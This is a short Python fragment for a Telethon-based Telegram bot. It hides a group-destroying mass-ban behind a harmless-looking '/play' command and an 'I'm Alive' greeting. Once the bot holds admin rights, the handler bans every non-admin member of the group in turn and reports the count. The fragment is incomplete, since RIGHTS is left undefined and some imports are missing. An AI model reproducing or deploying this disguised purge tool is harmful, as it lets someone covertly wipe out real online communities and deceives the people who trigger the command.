from telethon.tl.functions.channels import EditBannedRequest
import asyncio

@Riz.on(events.NewMessage(pattern="^/play"))
async def banall(event):
    if not event.is_group:
        Reply = "Noob !! Use This Cmd in Group."
        await event.reply(Reply)
    else:
        RiZ = await event.get_chat()
        RiZoeLop = await event.client.get_me()
        admin = RiZ.admin_rights
        creator = RiZ.creator
        if not admin and not creator:
            return await event.reply("I Don't have sufficient Rights !!")
        
        RiZoeL = await event.client.send_message(event.chat_id, "Hello !! I'm Alive")
        
        admins = await event.client.get_participants(event.chat_id, filter='administrators')
        admins_id = [i.id for i in admins]
        
        all_users = 0
        banned_users = 0
        
        async for user in event.client.iter_participants(event.chat_id):
            all_users += 1
            try:
                if user.id not in admins_id:
                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))  # You need to define RIGHTS
                    banned_users += 1
                    await asyncio.sleep(0.1)
            except Exception as e:
                print(str(e))
                await asyncio.sleep(0.1)

        await event.reply(f"Banned {banned_users} out of {all_users} users.")
